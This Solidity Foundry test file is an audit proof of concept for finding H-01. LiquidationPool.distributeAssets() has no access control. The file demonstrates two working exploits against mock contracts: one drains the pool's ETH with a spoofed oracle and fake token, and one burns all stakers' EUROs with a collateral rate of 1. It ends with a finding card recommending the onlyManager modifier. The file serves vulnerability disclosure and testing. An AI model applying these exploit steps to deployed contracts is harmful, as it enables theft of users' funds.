// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

// Reproduction:
//   git clone https://github.com/Cyfrin/2023-12-the-standard && cd 2023-12-the-standard
//   npm install
//   forge install foundry-rs/forge-std --no-commit
//   # foundry.toml: src="contracts", test="test", libs=["lib","node_modules"]
//   # remappings: forge-std/=lib/forge-std/src/, @openzeppelin/=node_modules/@openzeppelin/,
//   #             @chainlink/=node_modules/@chainlink/, contracts/=contracts/
//   forge test --match-contract PoC_H01 -vvvv

import "forge-std/Test.sol";
import {LiquidationPool} from "contracts/LiquidationPool.sol";
import {LiquidationPoolManager} from "contracts/LiquidationPoolManager.sol";
import {ILiquidationPoolManager} from "contracts/interfaces/ILiquidationPoolManager.sol";
import {ITokenManager} from "contracts/interfaces/ITokenManager.sol";
import {ERC20Mock} from "contracts/utils/ERC20Mock.sol";
import {EUROsMock} from "contracts/utils/EUROsMock.sol";
import {ChainlinkMock} from "contracts/utils/ChainlinkMock.sol";
import {TokenManagerMock} from "contracts/utils/TokenManagerMock.sol";

// ---------------------------------------------------------------------------
// Helper contracts
// ---------------------------------------------------------------------------

// Minimal SmartVaultManager stub — LiquidationPoolManager constructor calls
// ISmartVaultManager(svm).tokenManager(), so we need a compatible interface.
contract MockVaultMgr {
    address public tokenManager;
    uint256 public constant HUNDRED_PC = 100_000;
    uint256 public constant collateralRate = 120_000;
    constructor(address _tm) {
        tokenManager = _tm;
    }
    function protocol() external pure returns (address) {
        return address(0);
    }
    function burnFeeRate() external pure returns (uint256) {
        return 0;
    }
    function mintFeeRate() external pure returns (uint256) {
        return 0;
    }
    function totalSupply() external pure returns (uint256) {
        return 0;
    }
    function liquidateVault(uint256) external {}
}

// Fake Chainlink oracle — always reports price = 0.
// Used in test 1 to make costInEuros = 0 (stakers pay nothing in EUROs).
contract FakeChainlink {
    function decimals() external pure returns (uint8) {
        return 8;
    }
    function latestRoundData() external pure returns (uint80, int256, uint256, uint256, uint80) {}
}

// Fake ERC20 — transferFrom / transfer return true without moving tokens.
// Bypasses safeTransferFrom(manager, pool, _portion) inside distributeAssets().
contract FakeToken {
    function transferFrom(address, address, uint256) external pure returns (bool) {
        return true;
    }
    function transfer(address, uint256) external pure returns (bool) {
        return true;
    }
    function balanceOf(address) external pure returns (uint256) {
        return 0;
    }
}

// ---------------------------------------------------------------------------

/// @title  PoC — H-01: LiquidationPool.distributeAssets() has no access control
/// @notice Anyone can call distributeAssets() with arbitrary parameters.
///         Two independent attack vectors are demonstrated:
///
///         Test 1 — Fake Assets drain
///           Attacker passes a crafted Asset with a fake oracle (price=0) and a
///           fake ERC20 (no-op transferFrom), with amount inflated so that their
///           share of rewards equals the entire pool balance. After calling
///           claimRewards() they receive all real ETH from the pool.
///
///         Test 2 — Absurd _collateralRate burns all staker EUROs
///           Attacker passes _collateralRate=1 (vs. the normal 120 000) with a
///           real price oracle. costInEuros is inflated 120 000× and exceeds
///           every staker's EUROs balance, so the contract burns all of their
///           EUROs in exchange for a negligible portion of FakeToken (~5 500 gwei).
contract PoC_H01 is Test {
    // Protocol contracts
    LiquidationPool pool;
    LiquidationPoolManager poolManager;
    ERC20Mock TST;
    EUROsMock EUROs;
    ChainlinkMock clEthUsd;
    ChainlinkMock clEurUsd;
    TokenManagerMock tokenManager;

    // Attacker helpers
    FakeChainlink fakeOracle;
    FakeToken fakeToken;

    // Participants
    address owner = makeAddr("owner");
    address protocol = makeAddr("protocol");
    address user1 = makeAddr("user1");
    address victim = makeAddr("victim");
    address attacker = makeAddr("attacker");

    int256 constant ETH_PRICE = 2_000e8; // $2 000, 8 dec (Chainlink format)
    int256 constant EUR_PRICE = 110e6; // $1.10,  8 dec
    uint256 constant USER1_STAKE = 1_000e18;
    uint256 constant VICTIM_STAKE = 4_000e18;
    uint256 constant ATTKR_STAKE = 1e18; // 0.02% of total — negligible
    uint256 constant STAKE_TOTAL = USER1_STAKE + VICTIM_STAKE + ATTKR_STAKE; // 5 001e18
    uint256 constant POOL_ETH = 5 ether; // simulates prior liquidation rewards

    function setUp() public {
        // ChainlinkMock.setPrice() uses (block.timestamp - 4 hours); warp to avoid underflow.
        vm.warp(1 days);
        vm.deal(user1, 100 ether);
        vm.deal(victim, 100 ether);
        vm.deal(attacker, 100 ether);

        vm.startPrank(owner);

        TST = new ERC20Mock("TST", "TST", 18);
        EUROs = new EUROsMock();

        clEthUsd = new ChainlinkMock("ETH/USD");
        clEurUsd = new ChainlinkMock("EUR/USD");
        clEthUsd.addPriceRound(block.timestamp, ETH_PRICE);
        clEurUsd.addPriceRound(block.timestamp, EUR_PRICE);

        tokenManager = new TokenManagerMock(bytes32("ETH"), address(clEthUsd));

        poolManager = new LiquidationPoolManager(
            address(TST),
            address(EUROs),
            address(new MockVaultMgr(address(tokenManager))),
            address(clEurUsd),
            payable(protocol),
            50_000
        );
        pool = LiquidationPool(poolManager.pool());

        EUROs.grantRole(EUROs.MINTER_ROLE(), address(pool));
        EUROs.grantRole(EUROs.BURNER_ROLE(), address(pool));
        EUROs.grantRole(EUROs.MINTER_ROLE(), address(poolManager));

        fakeOracle = new FakeChainlink();
        fakeToken = new FakeToken();

        TST.mint(user1, USER1_STAKE);
        EUROs.mint(user1, USER1_STAKE);
        TST.mint(victim, VICTIM_STAKE);
        EUROs.mint(victim, VICTIM_STAKE);
        TST.mint(attacker, ATTKR_STAKE);
        EUROs.mint(attacker, ATTKR_STAKE);

        vm.stopPrank();

        // Stake and wait for the 24 h pending-stake lock-up to expire
        _stake(user1, USER1_STAKE);
        _stake(victim, VICTIM_STAKE);
        _stake(attacker, ATTKR_STAKE);
        vm.warp(block.timestamp + 1 days + 1);
        vm.prank(user1);
        pool.decreasePosition(0, 0); // triggers consolidatePendingStakes()
    }

    function _stake(address who, uint256 amount) internal {
        vm.startPrank(who);
        TST.approve(address(pool), amount);
        EUROs.approve(address(pool), amount);
        pool.increasePosition(amount, amount);
        vm.stopPrank();
    }

    // -----------------------------------------------------------------------
    // Test 1: Fake Assets — attacker drains all ETH from the pool
    // -----------------------------------------------------------------------
    function test_exploit_H01_fake_assets() public {
        deal(address(pool), POOL_ETH);

        // Inflate amount so attacker's portion == entire pool balance:
        //   portion = amount * attackerStake / stakeTotal  =>  amount = POOL_ETH * STAKE_TOTAL / ATTKR_STAKE
        uint256 malAmount = (POOL_ETH * STAKE_TOTAL) / ATTKR_STAKE;

        ILiquidationPoolManager.Asset[] memory assets = new ILiquidationPoolManager.Asset[](1);
        assets[0] = ILiquidationPoolManager.Asset(
            ITokenManager.Token({
                symbol: bytes32("ETH"), // matches real symbol => claimRewards() pays real ETH
                addr: address(fakeToken), // not address(0) => safeTransferFrom path (no-op)
                dec: 18,
                clAddr: address(fakeOracle), // price=0 => costInEuros=0 => no EUROs spent
                clDec: 8
            }),
            malAmount
        );

        uint256 before = attacker.balance;

        vm.startPrank(attacker);
        pool.claimRewards(); // clear any prior reward dust
        pool.distributeAssets(assets, 1, 100_000); // direct call — no onlyManager guard
        pool.claimRewards(); // collect ~5 ETH
        vm.stopPrank();

        assertGt(attacker.balance, before, "attacker must profit");
        assertLt(address(pool).balance, POOL_ETH / 10, "pool must be nearly drained");
    }

    // -----------------------------------------------------------------------
    // Test 2: Absurd _collateralRate — burns all staker EUROs for near-zero assets
    // -----------------------------------------------------------------------
    function test_exploit_H01_zero_cost_drain() public {
        deal(address(pool), POOL_ETH);
        uint256 eurosBefore = EUROs.balanceOf(address(pool));

        // amount = STAKE_TOTAL so portion_i = stake_i for every holder (non-zero for all).
        // _collateralRate = 1 inflates costInEuros by 120 000×, guaranteeing
        // costInEuros >> position.EUROs for every staker.
        ILiquidationPoolManager.Asset[] memory assets = new ILiquidationPoolManager.Asset[](1);
        assets[0] = ILiquidationPoolManager.Asset(
            ITokenManager.Token({
                symbol: bytes32("ETH"),
                addr: address(fakeToken), // no-op transferFrom
                dec: 18,
                clAddr: address(clEthUsd), // real price ($2 000) — no fake oracle needed
                clDec: 8
            }),
            STAKE_TOTAL
        );

        vm.prank(attacker);
        pool.distributeAssets(assets, 1 /*collateralRate*/, 100_000 /*hundredPC*/);

        (LiquidationPool.Position memory u1, , ) = _pos(user1);
        (LiquidationPool.Position memory vic, , ) = _pos(victim);
        (LiquidationPool.Position memory atk, , ) = _pos(attacker);

        // All 5 001 EUROs burned; stakers received ~27 500 gwei of FakeToken total.
        assertEq(EUROs.balanceOf(address(pool)), 0, "all pool EUROs must be burned");
        assertEq(u1.EUROs, 0, "user1 EUROs position must be 0");
        assertEq(vic.EUROs, 0, "victim EUROs position must be 0");
        assertEq(atk.EUROs, 0, "attacker EUROs position must be 0");
        // ETH balance unchanged — FakeToken assets do not touch the native balance.
        assertEq(address(pool).balance, POOL_ETH, "pool ETH must be unchanged");

        // Invariant broken: 5 001 EUROs destroyed, zero real collateral distributed.
        assertGt(eurosBefore, 0);
    }

    // pool.position() returns (Position, Reward[]) — helper to unpack cleanly
    function _pos(
        address who
    )
        internal
        view
        returns (LiquidationPool.Position memory p, LiquidationPool.Reward[] memory r, uint8 dummy)
    {
        (p, r) = pool.position(who);
    }

    // -----------------------------------------------------------------------
    // FINDING CARD
    // -----------------------------------------------------------------------
    //
    //  ID:        H-01
    //  Title:     LiquidationPool.distributeAssets() missing access control
    //  Severity:  High
    //  Contract:  LiquidationPool.sol  L205-L241
    //  Function:  distributeAssets(Asset[], uint256 _collateralRate, uint256 _hundredPC)
    //
    //  Description:
    //    The function is external with no onlyManager modifier. Any caller can
    //    supply an arbitrary Asset array with spoofed oracle/token addresses, or
    //    pass economically invalid values for _collateralRate and _hundredPC,
    //    bypassing all invariants enforced by runLiquidation().
    //
    //  Attack vectors (both demonstrated above):
    //    1. Fake oracle (price=0) + fake ERC20 (no-op transferFrom) + inflated amount
    //       => rewards[attacker][symbol] accumulates the entire pool balance
    //       => claimRewards() drains all real ETH / ERC-20 collateral from the pool
    //
    //    2. _collateralRate = 1 with a real price oracle
    //       => costInEuros is 120 000× above normal, exceeding every staker's balance
    //       => all EUROs positions are burned; stakers receive negligible FakeToken
    //       => stablecoin supply shrinks without a corresponding collateral return
    //
    //  Recommendation:
    //    Add the onlyManager modifier to distributeAssets():
    //      function distributeAssets(...) external payable onlyManager { ... }
}
